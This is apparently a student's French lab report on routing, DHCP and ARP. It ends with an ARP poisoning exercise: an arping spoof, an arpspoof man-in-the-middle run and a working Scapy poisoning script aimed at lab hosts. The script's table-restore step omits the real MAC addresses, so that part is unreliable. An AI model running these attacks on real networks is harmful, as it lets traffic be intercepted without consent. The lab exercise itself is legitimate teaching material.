# # TP2 : Routage, DHCP et DNS

🌞 **Configuration de `router.tp2.efrei`**

````
[alexandre@localhost ~]$ ping 8.8.8.8
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=114 time=38.0 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=114 time=39.5 ms
64 bytes from 8.8.8.8: icmp_seq=3 ttl=114 time=37.8 ms
# 64 bytes from 8.8.8.8: icmp_seq=4 ttl=114 time=35.4 ms
^C
--- 8.8.8.8 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3006ms
rtt min/avg/max/mdev = 35.381/37.683/39.502/1.478 ms
[alexandre@localhost ~]$
````
````
[alexandre@localhost network-scripts]$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:08:83:c0 brd ff:ff:ff:ff:ff:ff
    inet 192.168.122.166/24 brd 192.168.122.255 scope global dynamic noprefixroute enp0s3
       valid_lft 3125sec preferred_lft 3125sec
    inet6 fe80::a00:27ff:fe08:83c0/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
3: enp0s8: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:19:20:4e brd ff:ff:ff:ff:ff:ff
    inet 10.2.1.254/24 brd 10.2.1.255 scope global noprefixroute enp0s8
       valid_lft forever preferred_lft forever
    inet6 fe80::a00:27ff:fe19:204e/64 scope link 
       valid_lft forever preferred_lft forever
[alexandre@localhost network-scripts]$
````
🌞 **Configuration de `node1.tp2.efrei`**
````
[alexandre@localhost network-scripts]$ ping 10.2.1.254
PING 10.2.1.254 (10.2.1.254) 56(84) bytes of data.
64 bytes from 10.2.1.254: icmp_seq=1 ttl=64 time=7.40 ms
64 bytes from 10.2.1.254: icmp_seq=2 ttl=64 time=6.69 ms
64 bytes from 10.2.1.254: icmp_seq=3 ttl=64 time=12.3 ms
^C
--- 10.2.1.254 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2006ms
rtt min/avg/max/mdev = 6.694/8.788/12.275/2.482 ms
[alexandre@localhost network-scripts]$ tracepath 10.2.1.254
 1?: [LOCALHOST]                                         pmtu 1500
 1:  _gateway                                             11.441ms !H
 1:  _gateway                                              9.034ms !H
     Resume: pmtu 1500
[alexandre@localhost network-scripts]$
````
````
[alexandre@localhost ~]$ ping 8.8.8.8
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=114 time=38.0 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=114 time=39.5 ms
64 bytes from 8.8.8.8: icmp_seq=3 ttl=114 time=37.8 ms
64 bytes from 8.8.8.8: icmp_seq=4 ttl=114 time=35.4 ms
^C
````

**Utilisez une commande traceroute pour prouver que vos paquets passent bien par router.tp2.efrei avant de sortir vers internet**
````
[alexandre@localhost network-scripts]$ tracepath 8.8.8.8
 1?: [LOCALHOST]                                         pmtu 1500
 1:  _gateway                                             9.063ms
 1:  _gateway                                             9.024ms
 2:  192.168.122.1                                       12.384ms
 3:  b002-09.etudiants.campus.villejuif                  13.323ms
 4:  b002-09.etudiants.campus.villejuif                  43.442ms reached
     Resume: pmtu 1500 hops 4 back 3
[alexandre@localhost network-scripts]$
````

🌞 **Afficher la CAM Table du switch**
````
Switch#
Switch#show mac address-table
          Mac Address Table
-------------------------------------------

Vlan    Mac Address       Type        Ports
----    -----------       --------    -----
   1    0800.2719.204e    DYNAMIC     Et0/0
   1    0800.271a.956b    DYNAMIC     Et0/1
Total Mac Addresses for this criterion: 2
Switch#
````

🌞 **Install et conf du serveur DHCP** sur `dhcp.tp2.efrei`
````
"/etc/dhcp/dhcpd.conf" 14L, 313B written
[alexandre@localhost ~]$ sudo systemctl enable dhcpd
[ 4215.432688] systemd-rc-local-generator[11294]: /etc/rc.d/rc.local is not marked executable, skipping
[alexandre@localhost ~]$ sudo systemctl start dhcpd
[alexandre@localhost ~]$ sudo systemctl status dhcpd
● dhcpd.service - DHCPv4 Server Daemon
     Loaded: loaded (/usr/lib/systemd/system/dhcpd.service; enabled; preset: disabled)
     Active: active (running) since Tue 2024-12-10 17:30:27 CET; 5min ago
       Docs: man:dhcpd(8)
   Main PID: 11268 (dhcpd)
     Status: "Dispatching packets..."
      Tasks: 1 (limit: 23139)
     Memory: 5.2M
        CPU: 9ms
     CGroup: /system.slice/dhcpd.service
             └─11268 /usr/sbin/dhcpd -f -cf /etc/dhcp/dhcpd.conf -user dhcpd -group dhcpd --no-pid

Dec 10 17:30:27 localhost.localdomain dhcpd[11268]: Config file: /etc/dhcp/dhcpd.conf
Dec 10 17:30:27 localhost.localdomain dhcpd[11268]: Database file: /var/lib/dhcpd/dhcpd.leases
Dec 10 17:30:27 localhost.localdomain dhcpd[11268]: PID file: /var/run/dhcpd.pid
Dec 10 17:30:27 localhost.localdomain dhcpd[11268]: Source compiled to use binary-leases
Dec 10 17:30:27 localhost.localdomain dhcpd[11268]: Wrote 0 deleted entries to leases file.
Dec 10 17:30:27 localhost.localdomain dhcpd[11268]: Listening on LPF/enp0s8/08:00:27:ee:91:b5/10.2.1.0/24
Dec 10 17:30:27 localhost.localdomain dhcpd[11268]: Sending on   LPF/enp0s8/08:00:27:ee:91:b5/10.2.1.0/24
Dec 10 17:30:27 localhost.localdomain dhcpd[11268]: Sending on   Socket/fallback/fallback-net
Dec 10 17:30:27 localhost.localdomain dhcpd[11268]: Server starting service.
Dec 10 17:30:27 localhost.localdomain systemd[1]: Started DHCPv4 Server Daemon.
[alexandre@localhost ~]$
````

🌞 **Test du DHCP** sur `node1.tp2.efrei`

````
Executing the startup file

DDORA IP 10.2.1.10/24 GW 10.2.1.254

Hostname is too long. (Maximum 12 characters)

VPCS> show ip

NAME        : VPCS[1]
IP/MASK     : 10.2.1.10/24
GATEWAY     : 10.2.1.254
DNS         : 
DHCP SERVER : 10.2.1.253
DHCP LEASE  : 43185, 43200/21600/37800
MAC         : 00:50:79:66:68:00
LPORT       : 20005
RHOST:PORT  : 127.0.0.1:20006
MTU         : 1500

VPCS>
````

🌟 **BONUS**

````
VPCS> show ip

NAME        : VPCS[1]
IP/MASK     : 10.2.1.10/24
GATEWAY     : 10.2.1.254
DNS         : 1.1.1.1
DHCP SERVER : 10.2.1.253
DHCP LEASE  : 43185, 43200/21600/37800
MAC         : 00:50:79:66:68:00
LPORT       : 20005
RHOST:PORT  : 127.0.0.1:20006
MTU         : 1500
````
🌞 **Wireshark it !**


# III. ARP

## 1. Les tables ARP

🌞 **Affichez la table ARP de `router.tp2.efrei`**

````
[alexandre@router ~]$ arp -n
Address             HWtype  HWaddress           Flags Mask            Iface
10.2.1.100          ether   08:00:27:1a:95:6b   C                    enp0s8
10.2.1.253          ether   08:00:27:ee:91:b5   C                    enp0s8
192.168.122.1       ether   52:54:00:23:04:c2   C                    enp0s3
10.2.1.1            ether   08:00:27:1a:95:6b   C                    enp0s8
[alexandre@router ~]$
````

🌞 **Echange ARP avec Wireshark**

## 2. ARP poisoning

🌞 **Envoyer une trame ARP arbitraire**

````
┌──(kali㉿kali)-[~]
└─$ ping 10.2.1.254
PING 10.2.1.254 (10.2.1.254) 56(84) bytes of data.
64 bytes from 10.2.1.254: icmp_seq=1 ttl=64 time=31.9 ms
64 bytes from 10.2.1.254: icmp_seq=2 ttl=64 time=6.04 ms
^C
--- 10.2.1.254 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1001ms
rtt min/avg/max/mdev = 6.038/18.965/31.892/12.927 ms

┌──(kali㉿kali)-[~]
└─$ sudo apt update && sudo apt install arping -y
Hit:1 http://http.kali.org/kali kali-rolling InRelease
2026 packages can be upgraded. Run 'apt list --upgradable' to see them.
arping is already the newest version (2.25-1).
arping set to manually installed.
Summary:
  Upgrading: 0, Installing: 0, Removing: 0, Not Upgrading: 2026

┌──(kali㉿kali)-[~]
└─$ sudo arping -c 1 -I eth0 -S 10.2.1.254 -D 10.2.1.1
!!      0% packet loss (1 extra)

┌──(kali㉿kali)-[~]
└─$

````

🌞 **Mettre en place un ARP MITM**
````
┌──(kali㉿kali)-[~]
└─$ sudo arpspoof -i eth0 -t 10.2.1.1 10.2.1.254
8:0:27:fb:4c:8a  8:0:27:1a:95:6b  0806 42:  arp reply 10.2.1.254 is-at 8:0:27:fb:4c:8a
8:0:27:fb:4c:8a  8:0:27:1a:95:6b  0806 42:  arp reply 10.2.1.254 is-at 8:0:27:fb:4c:8a
8:0:27:fb:4c:8a  8:0:27:1a:95:6b  0806 42:  arp reply 10.2.1.254 is-at 8:0:27:fb:4c:8a
8:0:27:fb:4c:8a  8:0:27:1a:95:6b  0806 42:  arp reply 10.2.1.254 is-at 8:0:27:fb:4c:8a
8:0:27:fb:4c:8a  8:0:27:1a:95:6b  0806 42:  arp reply 10.2.1.254 is-at 8:0:27:fb:4c:8a
8:0:27:fb:4c:8a  8:0:27:1a:95:6b  0806 42:  arp reply 10.2.1.254 is-at 8:0:27:fb:4c:8a
...
(repetition de paquets ARP Reply similaires)
````

🌞 **Capture Wireshark `arp_mitm.pcap`**

🌞 **Réaliser la même attaque avec Scapy**
````
from scapy.all import ARP, send
import os
import time

# Activer le routage IPv4
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

# Configuration des IP cibles
victim_ip = "10.2.1.1"  # IP de node1.tp2.efrei
router_ip = "10.2.1.254"  # IP de router.tp2.efrei

def spoof(target_ip, spoof_ip):
    packet = ARP(op=2, pdst=target_ip, psrc=spoof_ip)
    send(packet, verbose=False)

try:
    print("[*] Lancement de l'attaque ARP MITM...")
    while True:
        spoof(victim_ip, router_ip)  # Empoisonner la victime
        spoof(router_ip, victim_ip)  # Empoisonner le routeur
        time.sleep(2)
except KeyboardInterrupt:
    print("[*] Arrêt de l'attaque. Réinitialisation des tables ARP...")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    send(ARP(op=2, pdst=victim_ip, psrc=router_ip), count=5, verbose=False)
    send(ARP(op=2, pdst=router_ip, psrc=victim_ip), count=5, verbose=False)
    print("[*] Tables ARP réinitialisées.")
````
Pour lancer le Script : 
````
sudo python3 arp_mitm.py
````
